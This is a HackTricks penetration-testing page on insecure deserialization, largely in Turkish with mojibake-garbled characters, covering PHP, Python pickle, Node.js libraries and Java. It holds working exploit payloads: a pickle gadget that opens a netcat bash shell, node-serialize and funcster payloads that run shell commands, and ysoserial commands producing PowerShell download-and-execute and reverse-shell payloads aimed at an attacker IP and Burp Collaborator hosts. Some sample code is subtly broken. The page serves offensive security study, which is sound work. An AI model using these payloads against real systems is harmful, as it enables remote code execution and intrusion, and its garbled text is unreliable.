# Deserialization

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

**SerileÅŸtirme**, bir nesneyi saklanabilir bir formata dÃ¶nÃ¼ÅŸtÃ¼rme yÃ¶ntemi olarak anlaÅŸÄ±lÄ±r; bu, nesneyi depolama veya bir iletiÅŸim sÃ¼recinin parÃ§asÄ± olarak iletme amacÄ± taÅŸÄ±r. Bu teknik, nesnenin daha sonra yeniden oluÅŸturulabilmesini saÄŸlamak iÃ§in yaygÄ±n olarak kullanÄ±lÄ±r ve yapÄ±sÄ±nÄ± ve durumunu korur.

**Deserialization** ise, serileÅŸtirmenin tersine olan sÃ¼reÃ§tir. Belirli bir formatta yapÄ±landÄ±rÄ±lmÄ±ÅŸ verileri alÄ±p, tekrar bir nesne haline getirmeyi iÃ§erir.

Deserialization tehlikeli olabilir Ã§Ã¼nkÃ¼ bu, **saldÄ±rganlarÄ±n serileÅŸtirilmiÅŸ verileri manipÃ¼le ederek zararlÄ± kod Ã§alÄ±ÅŸtÄ±rmasÄ±na veya nesne yeniden yapÄ±landÄ±rma sÃ¼recinde uygulamada beklenmedik davranÄ±ÅŸlar oluÅŸturmasÄ±na** olanak tanÄ±r.

## PHP

PHP'de, serileÅŸtirme ve deserialization sÃ¼reÃ§lerinde belirli sihirli yÃ¶ntemler kullanÄ±lÄ±r:

* `__sleep`: Bir nesne serileÅŸtirildiÄŸinde Ã§aÄŸrÄ±lÄ±r. Bu yÃ¶ntem, serileÅŸtirilmesi gereken nesnenin tÃ¼m Ã¶zelliklerinin adlarÄ±nÄ± iÃ§eren bir dizi dÃ¶ndÃ¼rmelidir. Genellikle bekleyen verileri taahhÃ¼t etmek veya benzer temizlik gÃ¶revlerini yerine getirmek iÃ§in kullanÄ±lÄ±r.
* `__wakeup`: Bir nesne deserialized edildiÄŸinde Ã§aÄŸrÄ±lÄ±r. SerileÅŸtirme sÄ±rasÄ±nda kaybolmuÅŸ olabilecek veritabanÄ± baÄŸlantÄ±larÄ±nÄ± yeniden kurmak ve diÄŸer yeniden baÅŸlatma gÃ¶revlerini yerine getirmek iÃ§in kullanÄ±lÄ±r.
* `__unserialize`: Bu yÃ¶ntem, bir nesne deserialized edilirken `__wakeup` yerine Ã§aÄŸrÄ±lÄ±r (varsa). Deserialization sÃ¼reci Ã¼zerinde `__wakeup`'a gÃ¶re daha fazla kontrol saÄŸlar.
* `__destruct`: Bu yÃ¶ntem, bir nesne yok edilmek Ã¼zereyken veya script sona erdiÄŸinde Ã§aÄŸrÄ±lÄ±r. Genellikle dosya tanÄ±tÄ±cÄ±larÄ±nÄ± veya veritabanÄ± baÄŸlantÄ±larÄ±nÄ± kapatmak gibi temizlik gÃ¶revleri iÃ§in kullanÄ±lÄ±r.
* `__toString`: Bu yÃ¶ntem, bir nesnenin bir dize olarak iÅŸlenmesine olanak tanÄ±r. Bir dosyayÄ± okumak veya iÃ§indeki iÅŸlev Ã§aÄŸrÄ±larÄ±na dayalÄ± diÄŸer gÃ¶revler iÃ§in kullanÄ±labilir ve nesnenin metinsel temsilini etkili bir ÅŸekilde saÄŸlar.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
EÄŸer sonuÃ§lara bakarsanÄ±z, nesne serileÅŸtirildiÄŸinde **`__wakeup`** ve **`__destruct`** fonksiyonlarÄ±nÄ±n Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶rebilirsiniz. BazÄ± eÄŸitimlerde **`__toString`** fonksiyonunun bir niteliÄŸi yazdÄ±rmaya Ã§alÄ±ÅŸÄ±rken Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶receksiniz, ancak gÃ¶rÃ¼nÃ¼ÅŸe gÃ¶re bu **artÄ±k olmuyor**.

{% hint style="warning" %}
EÄŸer sÄ±nÄ±fta uygulanmÄ±ÅŸsa, **`__unserialize(array $data)`** metodu **`__wakeup()`** yerine Ã§aÄŸrÄ±lÄ±r. Bu, serileÅŸtirilmiÅŸ veriyi bir dizi olarak saÄŸlayarak nesneyi serileÅŸtirmeye olanak tanÄ±r. Bu metodu, Ã¶zellikleri serileÅŸtirmek ve serileÅŸtirme sÄ±rasÄ±nda gerekli gÃ¶revleri yerine getirmek iÃ§in kullanabilirsiniz.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

AÃ§Ä±klamalÄ± bir **PHP Ã¶rneÄŸini burada** okuyabilirsiniz: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), burada [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) veya burada [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload SÄ±nÄ±flarÄ±

Arbitrary php dosyalarÄ±nÄ± yÃ¼klemek iÃ§in PHP autoload iÅŸlevselliÄŸini kÃ¶tÃ¼ye kullanabilirsiniz:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Referans DeÄŸerleri Seri Hale Getirme

Herhangi bir nedenle bir deÄŸeri **baÅŸka bir seri hale getirilmiÅŸ deÄŸere referans olarak** seri hale getirmek istiyorsanÄ±z:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) PHP deserialization'larÄ±nÄ± kÃ¶tÃ¼ye kullanmak iÃ§in payload'lar oluÅŸturmanÄ±za yardÄ±mcÄ± olabilir.\
UygulamanÄ±n kaynak kodunda bir deserialization'Ä± kÃ¶tÃ¼ye kullanmanÄ±n bir yolunu **bulamayabileceÄŸinizi** unutmayÄ±n, ancak **harici PHP uzantÄ±larÄ±nÄ±n kodunu kÃ¶tÃ¼ye kullanabilirsiniz.**\
Bu nedenle, mÃ¼mkÃ¼nse, sunucunun `phpinfo()`'sunu kontrol edin ve **internette** (hatta **PHPGGC**'nin **gadgets**'lerinde) kÃ¶tÃ¼ye kullanabileceÄŸiniz bazÄ± olasÄ± gadget'larÄ± arayÄ±n.

### phar:// metadata deserialization

EÄŸer sadece dosyayÄ± okuyan ve iÃ§indeki php kodunu Ã§alÄ±ÅŸtÄ±rmayan bir LFI bulduysanÄ±z, Ã¶rneÄŸin _**file\_get\_contents(), fopen(), file() veya file\_exists(), md5\_file(), filemtime() veya filesize()**_** gibi fonksiyonlar kullanarak.** **phar** protokolÃ¼nÃ¼ kullanarak bir **dosya** okurken meydana gelen bir **deserialization**'Ä± kÃ¶tÃ¼ye kullanmayÄ± deneyebilirsiniz.\
Daha fazla bilgi iÃ§in aÅŸaÄŸÄ±daki gÃ¶nderiyi okuyun:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Nesne unpickle edildiÄŸinde, _\_\_reduce\_\__ fonksiyonu Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r.\
KÃ¶tÃ¼ye kullanÄ±ldÄ±ÄŸÄ±nda, sunucu bir hata dÃ¶nebilir.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Before checking the bypass technique, try using `print(base64.b64encode(pickle.dumps(P(),2)))` to generate an object that is compatible with python2 if you're running python3.

For more information about escaping from **pickle jails** check:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

AÅŸaÄŸÄ±daki sayfa, **yamls** python kÃ¼tÃ¼phanelerinde **gÃ¼vensiz deserialization'Ä± istismar etme** tekniÄŸini sunmakta ve **Pickle, PyYAML, jsonpickle ve ruamel.yaml** iÃ§in RCE deserialization yÃ¼kÃ¼ oluÅŸturmak iÃ§in kullanÄ±labilecek bir araÃ§la bitmektedir:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Class Pollution (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Magic Functions

JS **PHP veya Python gibi "sihirli" fonksiyonlara** sahip deÄŸildir, sadece bir nesne oluÅŸturmak iÃ§in Ã§alÄ±ÅŸtÄ±rÄ±lacak. Ancak, **doÄŸrudan Ã§aÄŸrÄ±lmadan** bile **sÄ±klÄ±kla kullanÄ±lan bazÄ± fonksiyonlar** vardÄ±r, Ã¶rneÄŸin **`toString`**, **`valueOf`**, **`toJSON`**.\
EÄŸer bir deserialization'Ä± istismar ederseniz, bu fonksiyonlarÄ± **diÄŸer kodlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in tehlikeye atabilirsiniz** (potansiyel olarak prototype pollution'Ä± istismar ederek) ve Ã§aÄŸrÄ±ldÄ±klarÄ±nda rastgele kod Ã§alÄ±ÅŸtÄ±rabilirsiniz.

Bir fonksiyonu **doÄŸrudan Ã§aÄŸÄ±rmadan** Ã§aÄŸÄ±rmanÄ±n baÅŸka bir **"sihirli" yolu**, **bir async fonksiyondan dÃ¶nen bir nesneyi tehlikeye atmaktÄ±r** (promise). Ã‡Ã¼nkÃ¼, eÄŸer o **dÃ¶nÃ¼ÅŸ nesnesini** **"then" adÄ±nda bir fonksiyon tÃ¼rÃ¼nde bir **Ã¶zellik** ile baÅŸka bir **promise**'e **dÃ¶nÃ¼ÅŸtÃ¼rÃ¼rseniz**, baÅŸka bir promise tarafÄ±ndan dÃ¶ndÃ¼rÃ¼ldÃ¼ÄŸÃ¼ iÃ§in **Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r**. _Daha fazla bilgi iÃ§in_ [_**bu baÄŸlantÄ±yÄ±**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _takip edin._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` ve `prototype` kirlenmesi

Bu tekniÄŸi Ã¶ÄŸrenmek istiyorsanÄ±z **aÅŸaÄŸÄ±daki eÄŸitime gÃ¶z atÄ±n**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Bu kÃ¼tÃ¼phane fonksiyonlarÄ± serileÅŸtirmeye olanak tanÄ±r. Ã–rnek:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
**SerileÅŸtirilmiÅŸ nesne** ÅŸÃ¶yle gÃ¶rÃ¼necektir:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Ã–rnekte, bir fonksiyon serileÅŸtirildiÄŸinde `_$$ND_FUNC$$_` bayraÄŸÄ±nÄ±n serileÅŸtirilmiÅŸ nesneye eklendiÄŸini gÃ¶rebilirsiniz.

`node-serialize/lib/serialize.js` dosyasÄ±nda aynÄ± bayraÄŸÄ± ve kodun bunu nasÄ±l kullandÄ±ÄŸÄ±nÄ± bulabilirsiniz.

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

Son kod parÃ§asÄ±nda gÃ¶rebileceÄŸiniz gibi, **eÄŸer bayrak bulunursa** `eval` fonksiyonu kullanÄ±larak fonksiyon serileÅŸtirilir, bu nedenle temelde **kullanÄ±cÄ± giriÅŸi `eval` fonksiyonu iÃ§inde kullanÄ±lmaktadÄ±r**.

Ancak, **sadece bir fonksiyonu serileÅŸtirmek** **onu Ã§alÄ±ÅŸtÄ±rmaz**, Ã§Ã¼nkÃ¼ kodun bir kÄ±smÄ±nÄ±n **`y.rce`'yi Ã§aÄŸÄ±rmasÄ±** gerekir ve bu oldukÃ§a **olasÄ±lÄ±k dÄ±ÅŸÄ±dÄ±r**.\
Yine de, serileÅŸtirilmiÅŸ nesneyi **deÄŸiÅŸtirerek** **bazÄ± parantezler ekleyerek** nesne serileÅŸtirildiÄŸinde serileÅŸtirilmiÅŸ fonksiyonun otomatik olarak Ã§alÄ±ÅŸmasÄ±nÄ± saÄŸlayabilirsiniz.\
Son kod parÃ§asÄ±nda **son parantezi** ve `unserialize` fonksiyonunun kodu nasÄ±l otomatik olarak Ã§alÄ±ÅŸtÄ±racaÄŸÄ±nÄ± fark edin:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Daha Ã¶nce belirtildiÄŸi gibi, bu kÃ¼tÃ¼phane `_$$ND_FUNC$$_` sonrasÄ±ndaki kodu alacak ve **Ã§alÄ±ÅŸtÄ±racak** `eval` kullanarak. Bu nedenle, **otomatik olarak kod Ã§alÄ±ÅŸtÄ±rmak** iÃ§in **fonksiyon oluÅŸturma** kÄ±smÄ±nÄ± ve son parantezi **silip sadece bir JS tek satÄ±rÄ± Ã§alÄ±ÅŸtÄ±rabilirsiniz** aÅŸaÄŸÄ±daki Ã¶rnekteki gibi:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
You can [**find here**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± nasÄ±l istismar edeceÄŸiniz hakkÄ±nda daha fazla bilgi**.

### [funcster](https://www.npmjs.com/package/funcster)

**funcster**'Ä±n dikkate deÄŸer bir yÃ¶nÃ¼, **standart yerleÅŸik nesnelerin** eriÅŸilemezliÄŸidir; bunlar eriÅŸilebilir kapsamÄ±n dÄ±ÅŸÄ±ndadÄ±r. Bu kÄ±sÄ±tlama, yerleÅŸik nesneler Ã¼zerinde yÃ¶ntemleri Ã§aÄŸÄ±rmaya Ã§alÄ±ÅŸan kodun Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± engeller ve `console.log()` veya `require(something)` gibi komutlar kullanÄ±ldÄ±ÄŸÄ±nda `"ReferenceError: console is not defined"` gibi istisnalara yol aÃ§ar.

Bu sÄ±nÄ±rlamaya raÄŸmen, tÃ¼m standart yerleÅŸik nesneler dahil olmak Ã¼zere kÃ¼resel baÄŸlama tam eriÅŸimin geri kazanÄ±lmasÄ±, belirli bir yaklaÅŸÄ±m aracÄ±lÄ±ÄŸÄ±yla mÃ¼mkÃ¼ndÃ¼r. KÃ¼resel baÄŸlamÄ± doÄŸrudan kullanarak, bu kÄ±sÄ±tlamayÄ± aÅŸmak mÃ¼mkÃ¼ndÃ¼r. Ã–rneÄŸin, aÅŸaÄŸÄ±daki kod parÃ§asÄ± kullanÄ±larak eriÅŸim yeniden saÄŸlanabilir:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Daha fazla bilgi iÃ§in bu kaynaÄŸÄ± okuyun**[ **source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

**serialize-javascript** paketi yalnÄ±zca serileÅŸtirme amaÃ§larÄ± iÃ§in tasarlanmÄ±ÅŸtÄ±r ve yerleÅŸik bir deserialization yeteneÄŸi yoktur. KullanÄ±cÄ±lar, deserialization iÃ§in kendi yÃ¶ntemlerini uygulamaktan sorumludur. Resmi Ã¶rnek, serileÅŸtirilmiÅŸ verileri deserializing etmek iÃ§in `eval`'in doÄŸrudan kullanÄ±mÄ±nÄ± Ã¶nermektedir:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
EÄŸer bu fonksiyon nesneleri deseralize etmek iÃ§in kullanÄ±lÄ±yorsa, bunu **kolayca istismar edebilirsiniz**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Daha fazla bilgi iÃ§in bu kaynaÄŸÄ± okuyun**[ **source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo kÃ¼tÃ¼phanesi

AÅŸaÄŸÄ±daki sayfalarda, bu kÃ¼tÃ¼phaneyi kÃ¶tÃ¼ye kullanarak rastgele komutlar Ã§alÄ±ÅŸtÄ±rma hakkÄ±nda bilgi bulabilirsiniz:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Java'da, **deserialization geri Ã§aÄŸÄ±rmalarÄ± deserialization sÃ¼reci sÄ±rasÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**. Bu yÃ¼rÃ¼tme, bu geri Ã§aÄŸÄ±rmalarÄ± tetikleyen kÃ¶tÃ¼ niyetli yÃ¼kler oluÅŸturan saldÄ±rganlar tarafÄ±ndan istismar edilebilir ve zararlÄ± eylemlerin potansiyel olarak yÃ¼rÃ¼tÃ¼lmesine yol aÃ§abilir.

### Parmak Ä°zleri

#### Beyaz Kutu

Kod tabanÄ±nda potansiyel serileÅŸtirme zafiyetlerini tanÄ±mlamak iÃ§in arama yapÄ±n:

* `Serializable` arayÃ¼zÃ¼nÃ¼ uygulayan sÄ±nÄ±flar.
* `java.io.ObjectInputStream`, `readObject`, `readUnshare` fonksiyonlarÄ±nÄ±n kullanÄ±mÄ±.

AÅŸaÄŸÄ±dakilere ekstra dikkat edin:

* DÄ±ÅŸ kullanÄ±cÄ±lar tarafÄ±ndan tanÄ±mlanan parametrelerle kullanÄ±lan `XMLDecoder`.
* `XStream`'in `fromXML` metodu, Ã¶zellikle XStream sÃ¼rÃ¼mÃ¼ 1.46 veya daha dÃ¼ÅŸÃ¼kse, Ã§Ã¼nkÃ¼ serileÅŸtirme sorunlarÄ±na duyarlÄ±dÄ±r.
* `readObject` metodu ile birlikte kullanÄ±lan `ObjectInputStream`.
* `readObject`, `readObjectNodData`, `readResolve` veya `readExternal` gibi yÃ¶ntemlerin uygulanmasÄ±.
* `ObjectInputStream.readUnshared`.
* Genel `Serializable` kullanÄ±mÄ±.

#### Siyah Kutu

Siyah kutu testleri iÃ§in, java serileÅŸtirilmiÅŸ nesnelerini belirten belirli **imzalar veya "Sihirli Baytlar"** arayÄ±n ( `ObjectInputStream`'den kaynaklanan):

* OnaltÄ±lÄ±k desen: `AC ED 00 05`.
* Base64 deseni: `rO0`.
* `Content-type` baÅŸlÄ±ÄŸÄ± `application/x-java-serialized-object` olarak ayarlanmÄ±ÅŸ HTTP yanÄ±t baÅŸlÄ±klarÄ±.
* Ã–nceki sÄ±kÄ±ÅŸtÄ±rmayÄ± belirten onaltÄ±lÄ±k desen: `1F 8B 08 00`.
* Ã–nceki sÄ±kÄ±ÅŸtÄ±rmayÄ± belirten Base64 deseni: `H4sIA`.
* `.faces` uzantÄ±sÄ±na sahip web dosyalarÄ± ve `faces.ViewState` parametresi. Bu desenleri bir web uygulamasÄ±nda keÅŸfetmek, [Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md) hakkÄ±nda detaylÄ± bir inceleme yapÄ±lmasÄ±nÄ± gerektirmelidir.
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### AÃ§Ä±k olup olmadÄ±ÄŸÄ±nÄ± kontrol et

EÄŸer **Java Deserialized exploitinin nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± Ã¶ÄŸrenmek istiyorsanÄ±z** [**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md) ve [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md) belgelerine gÃ¶z atmalÄ±sÄ±nÄ±z.

#### Beyaz Kutu Testi

Bilinen gÃ¼venlik aÃ§Ä±klarÄ±na sahip herhangi bir uygulamanÄ±n kurulu olup olmadÄ±ÄŸÄ±nÄ± kontrol edebilirsiniz.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
You could try to **check all the libraries** known to be vulnerable and that [**Ysoserial** ](https://github.com/frohoff/ysoserial)can provide an exploit for. Or you could check the libraries indicated on [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
You could also use [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) to search for possible gadget chains that can be exploited.\
When running **gadgetinspector** (after building it) don't care about the tons of warnings/errors that it's going through and let it finish. It will write all the findings under _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Please, notice that **gadgetinspector won't create an exploit and it may indicate false positives**.

#### Black Box Test

Using the Burp extension [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) you can identify **which libraries are available** (and even the versions). With this information it could be **easier to choose a payload** to exploit the vulnerability.\
[**Read this to learn more about GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe is focused on **`ObjectInputStream` deserializations**.

Using Burp extension [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) you can **identify vulnerable libraries** exploitable with ysoserial and **exploit** them.\
[**Read this to learn more about Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner is focused on **`ObjectInputStream`** deserializations.

You can also use [**Freddy**](https://github.com/nccgroup/freddy) to **detect deserializations** vulnerabilities in **Burp**. This plugin will detect **not only `ObjectInputStream`** related vulnerabilities but **also** vulns from **Json** an **Yml** deserialization libraries. In active mode, it will try to confirm them using sleep or DNS payloads.\
[**You can find more information about Freddy here.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serialization Test**

Not all is about checking if any vulnerable library is used by the server. Sometimes you could be able to **change the data inside the serialized object and bypass some checks** (maybe grant you admin privileges inside a webapp).\
If you find a java serialized object being sent to a web application, **you can use** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **to print in a more human readable format the serialization object that is sent**. Knowing which data are you sending would be easier to modify it and bypass some checks.

### **Exploit**

#### **ysoserial**

The main tool to exploit Java deserializations is [**ysoserial**](https://github.com/frohoff/ysoserial) ([**download here**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). You can also consider using [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) which will allow you to use complex commands (with pipes for example).\
Note that this tool is **focused** on exploiting **`ObjectInputStream`**.\
I would **start using the "URLDNS"** payload **before a RCE** payload to test if the injection is possible. Anyway, note that maybe the "URLDNS" payload is not working but other RCE payload is.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
